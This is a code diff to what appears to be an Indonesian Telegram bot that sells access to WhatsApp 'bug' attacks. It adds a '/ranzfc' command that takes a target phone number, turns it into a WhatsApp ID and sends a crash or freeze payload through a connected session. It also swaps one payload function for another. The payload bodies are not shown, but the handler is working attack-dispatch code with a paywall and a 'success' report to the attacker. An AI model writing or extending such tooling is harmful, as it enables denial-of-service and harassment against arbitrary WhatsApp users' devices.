@@ -2746,7 +2746,7 @@ async function delay(sock, target) {
 }
 async function pedox(sock, target) {
   for (let i = 0; i < 1; i++) {
-      await FreezeGC(target);
+      await Cursormuani(target);
       console.log(chalk.red("Send Bug Succes"))
   }
 }
@@ -3222,6 +3222,90 @@ Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di baw
 /* 
   (-) Break (-)
 */
+bot.onText(/\/ranzfc (\d+)/, async (msg, match) => {
+                  const chatId = msg.chat.id;
+                  const senderId = msg.from.id;
+                  const targetNumber = match[1];
+                  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+                  const jid = `${formattedNumber}@s.whatsapp.net`;
+                  const randomImage = getRandomImage();
+                  const userId = msg.from.id;
+                  const cooldown = checkCooldown(userId);
+
+
+if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
+      return bot.sendMessage(chatId, "❌ Khusus Owner Ranz.");
+  }
+           if (shouldIgnoreMessage(msg)) return;
+
+            
+          if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+          return bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
+          caption: `\`\`\`MISKIN BUY AKSES SANA
+Mau akses?
+Silahkan beli ke Developer bot, contact Developer? tekan tombol Developer di bawah
+\`\`\`
+`,
+          parse_mode: "Markdown",
+          reply_markup: {
+          inline_keyboard: [[{ text: "DEVELOPER", url: "https://t.me/abee1945" }]]
+          }
+          });
+          }
+
+            try {
+                if (sessions.size === 0) {
+                return bot.sendMessage(
+                chatId,
+                "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addpairing 62xxx"
+                );
+ }
+    
+  
+
+           const sentMessage = await bot.sendPhoto(chatId, "https://qu.ax/bFgFd.jpg", {
+           caption: `
+\`\`\`
+( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃
+
+📁 Target : ${formattedNumber}
+🔎 Status : Succes sending bug ✅
+
+
+\`\`\`
+`, parse_mode: "Markdown"
+    });
+    
+   
+    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
+    await pedox(sock, jid);
+    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
+    
+    
+ await bot.editMessageCaption(`
+\`\`\`
+( ☠️ ) - 𝐑𝐚𝐧𝐳𝐆𝐎𝐎𝐃
+
+📁 Target : ${formattedNumber}
+🔎 Status : Succes sending bug ✅
+
+
+\`\`\`
+`, {
+      chat_id: chatId,
+      message_id: sentMessage.message_id,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [[{ text: "SUCCES BUG❗", url: `https://wa.me/${formattedNumber}` }]]
+      }
+    });
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
+  }
+});   
+
+
 
 bot.onText(/\/ranzunli (\d+)/, async (msg, match) => {
                   const chatId = msg.chat.id;
